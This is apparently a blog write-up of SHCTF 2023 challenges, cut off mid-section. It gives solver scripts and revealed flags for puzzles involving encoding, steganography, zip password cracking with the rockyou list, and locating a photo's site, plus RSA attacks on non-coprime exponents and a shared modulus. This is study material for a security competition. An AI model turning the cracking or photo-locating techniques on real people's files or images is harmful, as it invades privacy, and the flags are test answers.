<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="message"><a href="#message" class="headerlink" title="message"></a>message</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0001000D91683106019196F40008C26211002072B975915730671B54114F60000A000A592982B15C065265843D8A938A00000A000A5E8A9AA453D883525730000A000A91527CBE518D6E1751656CEA75D5000A000A6C899ED852305BF94E0D8D77000A000A8FD94E0053CC624B535191195230002062B14F4F4F6000530048004300540046007B00620061003900370038003400300035002D0062003100630038002D0038003400370063002D0038006500360039002D006600360032003100370037006500340063003000380037007D</span><br></pre></td></tr></table></figure>

<p>转16进制得到<code>SHCTF&#123;ba978405-b1c8-847c-8e69-f62177e4c087&#125;</code></p>
<h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wm14aFozdDBhR2x6WDJselgyWnNZV2Q5</span><br></pre></td></tr></table></figure>

<p>两次base64</p>
<p><code>flag&#123;this_is_flag&#125;</code></p>
<h3 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h3><p><img src="/../../images/2023SHCTF/where.jpg"></p>
<p>搜索关键词：<strong>一家幸运好玩的店</strong>，还有<strong>万达</strong></p>
<p>搜索到<a target="_blank" rel="noopener" href="https://www.lottery.gov.cn/xwzx/hy/20220513/10017006.html">探索合作经营新模式：山东首家自然人 商业综合体店盛大开业 (lottery.gov.cn)</a></p>
<p>地图搜索<strong>山东东营西城万达广场</strong>，定位到山东省东营市东营区北一路附近，然后找到中国石油大学</p>
<h3 id="可爱的派蒙"><a href="#可爱的派蒙" class="headerlink" title="可爱的派蒙"></a>可爱的派蒙</h3><p>图片拖入010，发现后面有PK开头的内容，于是把图片后缀改为zip</p>
<p>发现里面有两个内容重合度很高的txt文件，然后想着找出不同，写了个脚本就出了</p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&#x27;0.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data1 = f1.readlines()</span><br><span class="line">data2 = f2.readlines()</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data1)):</span><br><span class="line">   line1 = data1[i]</span><br><span class="line">  line2 = data2[i]</span><br><span class="line">  <span class="keyword">for</span> a,b <span class="keyword">in</span> <span class="built_in">zip</span>(line1,line2):</span><br><span class="line">    <span class="keyword">if</span> a != b:</span><br><span class="line">      flag += b</span><br><span class="line">      </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;4ebf327905288fca947a&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="ezmisc"><a href="#ezmisc" class="headerlink" title="ezmisc"></a>ezmisc</h3><p>一大串二进制的值，发现长度是841，因为841 &#x3D; 29*29，所以想到二维码</p>
<p>网上找了个二进制生成二维码的脚本</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">MAX = <span class="number">29</span></span><br><span class="line">pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX, MAX))</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;1111111011111111011000111111110000010011000101010001000001101110100011000110010010111011011101011010000100010101110110111010000111111000001011101100000100011101111010010000011111111010101010101010111111100000000000000111111100000000001011101000111010100100010010011000000101101111100010001110110010101001111010001110011101001001001100100010001000100110001001100010101001110100011010000110100110000001101111000001100111111000100101011111000110010000011111111111000111010110001110100100110011010011000011010000110011100100111011001110011010100110100111101101000110001001110101010010100100110001111101111111100010000000011110011010110001000011111110010000000001101010111100000101110100010101000100101011101011000001110011111111110111010010101001010000110100101110101111111011010001100011000001000111101111001001101011111110010100011110111100111&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,MAX):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,MAX):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">str</span>[i] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>扫了以后发现压缩包的密码是<code>hit_k1sme4_4_fun</code></p>
<p>打开flag文件，发现有PK头，改后缀为zip</p>
<p>又一个加密文档，右边备注了一串二进制。把他二进制转字符串得到<code>rockyou</code></p>
<p>想到rockyou字典，然后拿来爆破，最后得到密码是<code>palomino</code></p>
<p><img src="/../../images/2023SHCTF/22.png"></p>
<p>打开得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ksgeylalssgSlHffgS&#123;&#123;gHklesgg&#123;afkH&#123;lHalSkgygf&#123;&#123;kfgslg1l11Ss&#123;ellal&#123;f&#123;fka&#123;l&#123;gllaHf1elSsa14Hyl&#125;f&#125;Slmyfg4gleSlk1k&#123;Sfggga4aHg&#125;SlllgHHfgy1Sgaakfga1HmH&#123;sylgs&#123;ffkHyyaals&#123;S&#123;almklagfskyg&#123;f1a1yffe&#123;&#123;SSSylHagf1&#123;S&#123;Ham&#123;Sf&#125;ga&#125;fHlgl&#123;aSl1&#123;lkyfff&#125;flkHffaagHegSaHSkafgH&#123;ymaykSylS&#123;&#123;1llf&#123;efeHfaalaSafflmSlylaslfk&#125;mlllaaHSfk&#123;SyH&#123;yayyf&#123;lyy1ylaff&#123;aaygfl2333amSaeHy&#123;fms&#123;ySamkSga&#123;ffylaalHlfgfglafHSSH&#123;algmff1SSHHflSkSeygff14sgSl1ff41HkHaaal&#123;k553klgfffmslk&#123;Haylam&#123;&#123;llfggSlggaya&#123;SaSg&#123;lya&#123;fflyaafk&#123;aflkgay&#123;kHg&#123;fgkff1&#123;akefeSlfmySkgglka&#123;mSfmSemgykSSl1gfgHllgkygmfafmfakaaegafHgklSklaaH1HglgfeS41lgkS&#123;ggaHmmSlfykfas4f&#123;afgHaa&#123;ylaf&#123;&#123;eHS4lHf&#123;gfg&#123;eSlSf&#123;gsaSgyfSyHfHHagkSaS&#123;&#123;fa1yalsf&#123;flf1f&#123;&#123;&#123;fafakfsmaef4amHsyfSaH56789gfl&#123;&#123;&#123;1yySlkael41Say&#123;faffaSHy4Ss&#123;eHyfmlykSm&#125;&#123;&#123;ygaalgg&#123;kHlHelffHasfaaf&#123;SykfS666l&#123;SS1&#123;SygfgaHgSllf4effgHHykklSl1ga1lHafsy&#123;f&#123;141yaakllla1al4SaffgflalkSS1llg1&#123;af&#123;SyygsSSseHffemfHlaflfgkeag&#123;gfSgmlkmflSlgHkSfylffllHya&#123;ksgySlHHglg&#123;H1lyf&#123;f1gggHaffS&#123;afalafg7825fakaSfyfg11gfHkfySsaaafff1&#123;mfgalfa&#123;gay1ySf&#123;asHgg1HaHfkl1la11fsg&#123;S11all&#123;g&#123;lyfHeala&#123;f1agg&#123;fHHglH1&#123;SSfaSleyayaSy&#123;yHylyHHl&#123;ggayf&#125;f11a&#123;asf&#123;gmf&#123;&#123;&#123;SykHk1sSm1l&#125;sgmSSff11a&#125;SaSfHsmg&#125;g&#123;kallf&#123;llHssl&#123;ffsffagHgkHaa&#123;f&#123;f&#123;alfglgaaS4sgHmkgSagl1lfSslfHyf&#123;fglH&#123;llfsaaSaglslgy11yfykHygf&#123;lyfyfg&#125;gafgSfaeg4fka&#123;SaHllk&#123;&#123;fks&#123;1f1S1gyl&#123;fflkyllafHl1Sslgyga&#123;llkHlHyaylgaf&#123;skSH1yyfgf&#123;Sflg&#123;4aHSa&#123;kkekH&#123;yygmygl&#123;gf1aleglfm&#123;ygHSHHykSH&#123;Hl&#123;y&#123;&#123;Sa&#123;k&#123;gg1ayfayg&#123;gSg&#123;ffg1llHsa&#123;Hls1Slfg&#123;m&#123;fHHf&#123;mm&#123;l1llk&#123;fffeyH4falla#s1&#123;lyggaykeffS&#123;lkgls&#123;gkeak&#123;l1gS&#123;kH4f&#123;lglgkSagS1yfem11&#123;ml1fsklyllSlgfseag&#123;glkSSfl1ylffalmgfsfaHly4k&#123;saSSkkSH&#123;malf&#123;&#123;g&#123;gSm1lafyy&#123;lsall&#125;aHg1aafaS1klSaHHa&#123;llfSesaySgafgeySllaH1s&#123;gygHHSfy&#123;HSa&#123;l&#123;ffka1alkfagsge&#123;lfgflgk&#123;Slfl&#123;ya&#123;gff1aHmfSgHSsf1SalS5656alfyyllfa&#123;yk&#123;s&#123;&#123;lfaSay&#123;&#123;gaH&#123;HS&#123;aSly1slyHfgaHm&#123;S&#123;ggffmSHakafaSHmSHS&#123;alkggfkHHgy&#123;eS1g&#123;HklfHgH&#123;a41a&#123;gsflgfaygSsfaglygl1ffHlysllsSsf&#123;HlHaaSl&#123;kgflkH&#123;sgykyHfsyHly&#123;klHgSfSal4f1lya4lkala&#123;f（SH&#123;laf1kffyylfflgffg&#125;Sa1HsllSSS1aHgglHl&#123;alHffg1eylsffsysllkSfllgylS&#123;fHSSmlagHflSH1Hmalsg&#123;af&#123;SlySleyfHfasH&#125;SeyalslkagySHaffaffmfggaam1kal&#123;Sff&#123;&#123;alg&#123;s&#123;lsgHmaHSmllgHfaHSl11sHlgygskgHmkaaa1fllfggf&#123;ggygffygfyfkgS1sgS&#123;gfflHa1lagSe&#123;fffga1sS&#123;&#123;H&#123;gSsfHSg&#125;Ha&#123;Slf#$%1asa1gyfllS&#123;yflyg1sSSmkfyykfggaHfHHkSfa&#123;fSleskmagslgeflllayff&#123;ySslySl&#125;kf&#123;agsgkkmHklHSs&#123;k&#125;glllmys1fSll1fSgyy&#123;&#123;sa&#123;mga&#123;gaka1lH1malfklSHaaklfklf1fglakalyaHas1ff4HfffSayg&#123;&#123;gH1kse&#123;gage&#123;skHaSHy1fekHgayk1gkgmS&#123;g&#123;1glgSfy&#123;mg&#123;asg&#123;fkafalfygf&#123;l1SHSl1ka&#123;&#123;ayHkS1g&#123;ay1glSaSHa&#123;Hsff1lfS4H&#123;&#123;ae1lHSlllSmafHSH&#123;kak&#123;ggy1H&#123;fagSH4a1HfSgl&#123;a&#125;a&#123;Sf&#123;lHHf&#123;kayl1l&#123;flSfglfelySggfal&#123;a&#125;&#123;aa&#123;S1gf1SaHfaf&#123;SmaSgHl&#123;falHyggHg&#123;ggglff&#123;klfkSfyllSgk&#125;gfafayHHygaflkS&#123;als&#123;SflkSls1fSgygygf4fHHge&#125;flyggafS&#123;fmafl&#123;fyykHafSHH&#123;14af1ysaH&#123;lkfk&#123;kSS1&#123;fafH&#123;1mHall&#123;sflffa1fl1llf1SkyfafeHa&#123;gfkSlggfsgmSlH&#123;gSllHaSHa1&#123;faSyllyysa&#123;1sfla&#123;1SmfSgy1lslayfaya1agHl4a&#123;fSmmaklHkafkfHfgyHSS&#123;&#123;ay&#123;ylaH1ylHH&#123;gsyHHflfSyg2^%efSlfygg&#123;Sfa&#123;&#123;kSfy&#123;fHlaag&#123;lllagl&#123;aSfkHkgaSfafSfSafl1yss1ymHSSseafk&#123;&#123;a&#123;f&#123;Sa&#123;Hsffffyam4HmmkSakfagyHkglgSefsagmHSaa&#123;lSlykH&#123;lSlHagysgak&#123;llfys&#123;4&#123;Sl4gyamfa&#123;yllf&#123;SSgf&#123;&#123;4g&#123;&#123;alfkg&#123;yklaSgyklyHglsalgfaS4aH4llk&#123;Sl&#123;gkyH&#123;kgsSg&#123;kgkma&#125;kya&#123;sgf&#123;Hfll1ay@gk4sSgeHg&#123;4fHlsskaSaaffffHHSgakSmS1lsa&#123;gsSf&#123;gfylH&#123;l1&#123;gHSaga&#123;lgkkHHH&#123;mfkgHaf1&#123;SlSkHffggsH&#123;HlHmSyfylHSg1SlgggafSHSalfgfae1S1amHfele&#123;lyf11SgSsS&#123;fSs1g&#123;S1yyfSylS&#123;sgSlg&#123;lflSSeaSSgsHSegllygylaflag&#123;&#125;fglgHlSaH&#123;SsaalyHfgkalfyfHmly1fsyyySS4SasagflaS&#123;&#123;yfayl4HHlksl&#123;lHkfSlfyaaff&#125;HkffgSyHl&#123;a1&#123;gSglsafSmfegsgsHfkafSg&#123;falmgf&#125;&#123;llHHkHkHyslagHyfg&#123;f&#123;&#123;lSe&#123;gaSmfH1y&#123;&#123;g&#123;&#125;as1&#123;&#123;af&#123;flH&#123;gaglSSaSaSffg1afgallggyaa&#123;&#123;yalS4ykSySk1gky&#123;gs&#123;g&#123;ll1lSlyafykgg1fs&#123;4&#123;1fslfS&#123;slkSy4mskHkflyf&#123;lk4f1aS2359afall1kk&#123;eg1fyH&#123;l1agylyf&#123;HkSyg&#123;mall&#123;l1g1f1laayfHslalykkylslma&#123;4s&#123;HagSka1Hsal1kHkSSfSy1&#123;Skyags&#123;kHmfglglf&#123;lg&#123;fa1fgSmllmffksgafgl1aa&#123;lmmay&#123;ySglHfH4l4Hf&#123;&#123;&#123;gllylgSafHgfHllSefgaSlf&#123;fgf&#123;lgSS@syl&#123;gkSmkaykllHSy1ffkSS1aSfeggSgsyflHaHHlkklHaslf&#123;&#125;Ss&#123;laaHalHSHyskSgkySl&#123;&#123;Sgsaf1Hlfaykg&#123;Hkll&#123;sasl1ffe&#123;&#123;kkkfgy1ffHflsglfgSfHffy11y&#123;fffly1yklk&#123;fHHmagalfygHaglfSfSSakfflaHffl&#123;ffglfaHg&#123;skaal&#123;fHfSSfy1Hfffmy&#123;llllffma&#123;eaS&#123;s&#123;lgHHlSaef1glSfgH4esaSyHy&#123;aSfagHlkll1fkfHf&#123;m1SsSk&#125;ygfylgS11&#123;flkflkaksflafk&#123;llsfafsfay&#123;1lfgygHSgfH4gSfS&#123;mySHasf1aSkffsykkS1lfHagffa&#123;fHlyaHe&#123;SSfS&#123;&#125;S&#123;gyykefkl&#123;&#123;afl1ffykSkyH&#123;klSsgfSk&#123;g1&#123;f1klffSsa1&#123;afaagH&#123;s&#123;a&#123;1agafa1sfgmkf1gfylggSfkaSalHffHgf&#123;gHSfgHsglmllsllyfmH&#123;sySSgHSaa1flSfgkglms4&#123;HffHgfgSaglafg&#123;yakgg&#123;algfyl&#123;HH1feaagllgsHlfglaHkfkfglfy1&#123;mHlmgfkSay1fHkfskmsyklsyska&#123;&#123;1HagHSySkHleflakkH&#123;Sgfy&#123;faff&#123;Hgmk1fky1lffag&#123;fSggySamlyfgffHgll&#123;lfkSfHafyfal@@@ffllkmylf&#123;yklH&#123;aya&#123;14yla&#123;SlllyaHaaa&#123;e1gamamaSskmkaafyalgffle&#123;aHym&#123;s1lf&#123;l1aaSe&#123;lgHf&#123;klkHH&#123;&#123;&#123;HlfyHaHaa1Sa&#123;SSggHl1&#123;magf11kH1kHsyg&#123;&#123;g1&#123;afySmy111klykagHSksgflesggggleg&#123;aalSm&#123;asgfg1&#123;ylHfa&#123;alSllg&#123;HkggksHlfml&#123;a1HafamflHaa1alfygHSgS1l1fHaa1maSa&#123;lfalalkSyaa&#123;f</span><br></pre></td></tr></table></figure>

<p>词频分析得到<code>flag&#123;SHyk1sme4&#125;563@2789#%（$^</code></p>
<h3 id="也许需要一点py"><a href="#也许需要一点py" class="headerlink" title="也许需要一点py"></a>也许需要一点py</h3><p>摩斯解码得到压缩包密码<code>this1sy0ukey</code></p>
<p>打开得到</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">is</span> it the true flag？</span><br><span class="line">flag&#123;pNg_and_Md5_SO_GreaT&#125;</span><br></pre></td></tr></table></figure>

<p>另外一个flag文件拖到010，发现前8位被改为了<code>00000000</code>，但是后面紧接着<code>0D0A</code></p>
<p>可能是PNG，把<code>00000000</code>改为<code>89504E47</code></p>
<p>打开得到</p>
<p><img src="/../../images/2023SHCTF/flag.png"></p>
<p>根据题目：<strong>这flag没大没小的</strong>，猜想flag的字母得互换大小写，于是写了个脚本爆破</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&quot;pNg_and_Md5_SO_GreaT&quot;</span></span><br><span class="line"><span class="built_in">hash</span> = <span class="string">&quot;63e62fbce22f2757f99eb7da179551d2&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product([<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>],repeat=<span class="number">20</span>):</span><br><span class="line">    c = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">    m = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> a,b <span class="keyword">in</span> <span class="built_in">zip</span>(c,cipher):</span><br><span class="line">        <span class="keyword">if</span> b == <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">            m += <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> a == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                m += b.lower()</span><br><span class="line">            <span class="keyword">if</span> a == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                m += b.upper()</span><br><span class="line">    hash_m = hashlib.md5(m.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> hash_m == <span class="built_in">hash</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span> + m + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span> </span><br><span class="line"><span class="comment">#flag&#123;Png_AnD_md5_so_GReAt&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Steganography"><a href="#Steganography" class="headerlink" title="Steganography"></a>Steganography</h3><p>第一张图片用010打开，发现末尾有一串base64密文，解码得到：<code>12ercs.....909jk</code></p>
<p>第二长图片属性备注里有<code>xqwed</code>，拼接得到密码<code>12ercsxqwed909jk</code></p>
<p>打开即是flag</p>
<h3 id="真的签到"><a href="#真的签到" class="headerlink" title="真的签到"></a>真的签到</h3><p>扫码关注公众号，发信息</p>
<h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="e"><a href="#e" class="headerlink" title="e?"></a>e?</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p= <span class="number">70724362259337647663584082414795381346569735601816096923682814277857463878289</span></span><br><span class="line">q= <span class="number">114427188167532721707398034034072867253267857672869034942206947096293901917007</span></span><br><span class="line">e= <span class="number">1314</span></span><br><span class="line">c= <span class="number">4308122681135507736058122041934864039713319497673888928736468819190185301630702240416683093700232966794026900978699666246019059398861283337865339404916304</span></span><br></pre></td></tr></table></figure>

<p>$e$和$\phi(n)$不互素</p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p= <span class="number">70724362259337647663584082414795381346569735601816096923682814277857463878289</span></span><br><span class="line">q= <span class="number">114427188167532721707398034034072867253267857672869034942206947096293901917007</span></span><br><span class="line">e= <span class="number">1314</span></span><br><span class="line">c= <span class="number">4308122681135507736058122041934864039713319497673888928736468819190185301630702240416683093700232966794026900978699666246019059398861283337865339404916304</span></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">t = gmpy2.gcd(e,phi)</span><br><span class="line">d = gmpy2.invert(e // t,phi)</span><br><span class="line">M = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">m = gmpy2.iroot(M,t)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex((<span class="built_in">hex</span>(m)[<span class="number">2</span>:])))</span><br><span class="line"><span class="comment">#flag&#123;This_e_is_real_or_not&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="ez-rsa"><a href="#ez-rsa" class="headerlink" title="ez_rsa"></a>ez_rsa</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from flag import flag</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> prod</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read().strip()</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag[:<span class="number">19</span>],<span class="string">&quot;big&quot;</span>)</span><br><span class="line">m1 = <span class="built_in">int</span>.from_bytes(flag[<span class="number">19</span>:],<span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">primes = [getPrime(<span class="number">64</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">n = prod(primes)</span><br><span class="line">c = <span class="built_in">pow</span>(m1,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"></span><br><span class="line">p = libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line">q = libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line">e1 = <span class="number">13</span></span><br><span class="line">e2 = <span class="number">15</span></span><br><span class="line">n1 = p * q</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e1, n1)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m1, e2, n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n1 =&quot;</span>, n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1 =&quot;</span>, e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 =&quot;</span>, c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n2 =&quot;</span>, n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2 =&quot;</span>, e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 =&quot;</span>, c2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = 28535916699190273475273097091422420145718978597126134891571109006456944397344856577421369324831702083810238921719657496747722337086131545474384253288151783029981352196506749672783866527948391034258269669654392993063423671431837882584570973320095601407578443348352802850496429240170710269529489900871208384711844617081275862971410246759090936379744946527813691945129059991795202769186014306943707223831130752782380563227353615164053563120572722464543812139164048342504963081408349934180883607554389607335607410546630525512019818062185681153477671373000186961748278118124044645584490544698827467815360888525822167</span></span><br><span class="line"><span class="comment"># n = 114107341297408283801468814470303963122122556489590451040619457052827864984505912502462030175984161431709841571908269123131659496812467145870607611968843929870716066046232009282431653653484798819370087696248364531531706249180822839879862098012984590503284615395588919199545142177727328844260380842155437987767067800740569616584597507776426572206990858918111272636507821551592564540694671795374831548677720629329358177802890287837056940407030212276399942462042866947423728888561392653713356355778914658317507319575084393752755452971007289968044006561357799908892371839922838486713582082980752194204224263283004373</span></span><br><span class="line"><span class="comment"># n1 = 21235204662158833223664424963408105101885570855652885953922511758363954474947609854216589644512813634294435585894296340005122907229365513346971631594453999584706013889403572150499529308966742992668850443386284277210686717652643585324255759216699733045642544284406720854291604837774882256435503827543483289606177965628162259184958789025311291796067574924595051311298594432767265114154138693108465671184854794167878031822162731921299518989845784744659944947091213703810190708463199067553747177712259911724424547999547534441790125049383068377243727588278432796727885216967953646999183906479537750330738956233695342750567</span></span><br><span class="line"><span class="comment"># e1 = 13</span></span><br><span class="line"><span class="comment"># c1 = 5640630966585093229374938575158853304507369792931959909038819773057666482368490365383634362421839045569190487785222799103423460816096797210546343809620912249021763787314569982909943181390882015170344954037813745251119237402775124991005154299085147091159741067430623420349690886728161235034687649593258746455165172528681627568611599473627285223154284756417744280966157271904828156564067870877521824545300153084830020169048653830385763172792698591998191641849931039720453035065355411394516308865955772746815765864888631258825704788352584540380169938419618543124830541663995097651872542381</span></span><br><span class="line"><span class="comment"># n2 = 21235204662158833223664424963408105101885570855652885953922511758363954474947609854216589644512813634294435585894296340005122907229365513346971631594453999584706013889403572150499529308966742992668850443386284277210686717652643585324255759216699733045642544284406720854291604837774882256435503827543483289606177965628162259184958789025311291796067574924595051311298594432767265114154138693108465671184854794167878031822162731921299518989845784744659944947091213703810190708463199067553747177712259911724424547999547534441790125049383068377243727588278432796727885216967953646999183906479537750330738956233695342750567</span></span><br><span class="line"><span class="comment"># e2 = 15</span></span><br><span class="line"><span class="comment"># c2 = 5481001445755770090420425478456880914921441486935672376394423326451811448703288166341447356603281843336826624725965666634194700496514262129376916108926167953996689011980280761368893884042609095616407660087448963015169181749124738976578495911295096014725354350167650232970262765851074146687931181216305972147994236689422572940877763047930111954798962097847426932730342258169023809341164876019161104439561164839132092594444017039073155506935768658830659965630065643619399324102814118128802834719820426253836317043818687888302054465994498115387703382090351794495827905499417861507007863378916334790750453883661675063377</span></span><br></pre></td></tr></table></figure>

<h4 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h4><p>yafu分解得到32各因子求$\phi(n)$</p>
<h4 id="part2"><a href="#part2" class="headerlink" title="part2"></a>part2</h4><p>共模攻击</p>
<p>$c_1 \equiv m^{e_1} \mod n$，$c_2 \equiv m^{e_2} \mod n$</p>
<p>$\because gcd(e_1,e_2) &#x3D; 1$</p>
<p>根据扩展欧几里得算法，存在x,y使得$e_1x + e_2y &#x3D; gcd(e_1,e_2) &#x3D; 1$</p>
<p>$\therefore c_1^x \times c_2^{y} \equiv m^{e_1x + e_2y} \equiv m \mod n$</p>
<p>exp:</p>
